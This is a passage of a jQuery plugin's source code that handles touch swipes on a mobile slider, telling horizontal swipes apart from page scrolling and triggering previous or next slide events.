						differenceY = event.originalEvent.touches[0].clientY - slider.touchPos.Y;

						//check if user is scrolling the window or moving the slider
						if(Math.abs(differenceX) > Math.abs(differenceY))
						{
							event.preventDefault();

							if(slider.touchPos !== event.originalEvent.touches[0].clientX)
							{
								if(Math.abs(differenceX) > 50)
								{
									i = differenceX > 0 ? 'prev' : 'next';

									if(typeof slider.options[i] === 'string')
									{
										slider.find(slider.options[i]).trigger(slider.options.event[i], ['swipe']);
									}
									else
									{
										slider.options[i].trigger(slider.options.event[i], ['swipe']);
									}

									slider.hasMoved = true;
									slider.touchPos = {};
									return false;
								}
							}
						}
	                }
				});
			}
		};

		return this.each(function()
		{
			if(isMobile)
			{
				var slider	= $(this);

				slider.options	= $.extend({}, defaults, passed_options);

				methods.activate_touch_control(slider);
			}
		});
	};













}(jQuery));



